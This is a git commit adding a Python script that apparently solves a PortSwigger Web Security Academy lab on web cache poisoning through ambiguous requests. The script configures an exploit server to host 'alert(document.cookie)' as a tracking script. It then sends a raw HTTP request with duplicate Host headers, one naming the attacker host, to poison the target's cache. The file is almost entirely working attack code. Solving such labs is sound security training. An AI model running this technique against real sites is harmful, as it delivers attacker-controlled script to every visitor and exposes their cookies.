0a59ce0f87920f2f72f081c8d0a70e23cbfab2db
Michael Posteraro <103565535+MichaelPosteraro15@users.noreply.github.com>
2025-12-18 14:22:46 +0100

    With the right logic

---
+++ web_cache_poisoning_via_ambiguous_requests(modified).py
@@ -0,0 +1,87 @@
+import socket
+import ssl
+import time
+import requests # pyright: ignore[reportMissingModuleSource]
+from urllib.parse import urlparse
+
+evil_url = "https://exploit-0a700023037dbda180780c8c01b500cd.exploit-server.net/" 
+evil_host = urlparse(evil_url).hostname
+
+url = "https://0ad8009b03b4bddc80520db4007c009c.h1-web-security-academy.net/"
+host = urlparse(url).hostname
+
+print("Target host: " + str(host))
+print("Evil host: " + str(evil_host))
+
+# 1) Creating the payload at /resources/js/tracking.js on Exploit server.
+session = requests.Session()
+session.get(url) # Visita il lab per ottenere i cookie iniziali
+
+lab_cookie = session.cookies.get('_lab')
+session_cookie = session.cookies.get('session')
+
+if not lab_cookie or not session_cookie:
+    print("Cannot retrieve cookies.")
+    exit()
+
+payload = {
+    "urlIsHttps": "on",
+    "responseFile": "/resources/js/tracking.js",
+    "responseHead": "HTTP/1.1 200 OK\r\nContent-Type: application/javascript; charset=utf-8",
+    "responseBody": "alert(document.cookie)",
+    "formAction": "STORE"
+}
+
+try:
+    response = session.post(evil_url, data=payload)
+
+    if response.status_code == 200:
+        print("Exploit server configured.")
+    else:
+        print("Problem during Exploit server configuration.")
+        print(response.text)
+
+except Exception as e:
+    print(f"Connection error.")
+
+# 2) Get the session cookies
+
+# Set the cookie inside the header.
+cookie_header_value = f"session={session_cookie}; _lab={lab_cookie}"
+
+# Sleep beacause the script have already made a get request for the cookies.
+# The wab cache store the page for 30 seconds.
+time.sleep(35)
+
+# 3) Send the request with the paylaod containint the two host. The second host containt the evil_host.
+# Here wb cache poisoning happen.
+context = ssl.create_default_context()
+try:
+    with socket.create_connection((host, 443)) as sock:
+        with context.wrap_socket(sock, server_hostname=host) as ssock:
+            
+            request_payload = (
+                f"GET / HTTP/1.1\r\n"
+                f"Host: {host}\r\n"
+                f"Host: {evil_host}\r\n"
+                f"Cookie: {cookie_header_value}\r\n" 
+                f"Connection: close\r\n"
+                f"\r\n"
+            )
+
+            ssock.sendall(request_payload.encode())
+            
+            '''
+            response = b""
+            while True:
+                data = ssock.recv(4096)
+                if not data:
+                    break
+                response += data
+
+            print(response.decode(errors='ignore'))
+            '''
+            print(f"Successful exploit. Cache poisoned.")
+            print("Lab solved.")
+except Exception as e:
+    print(f"Failed.")
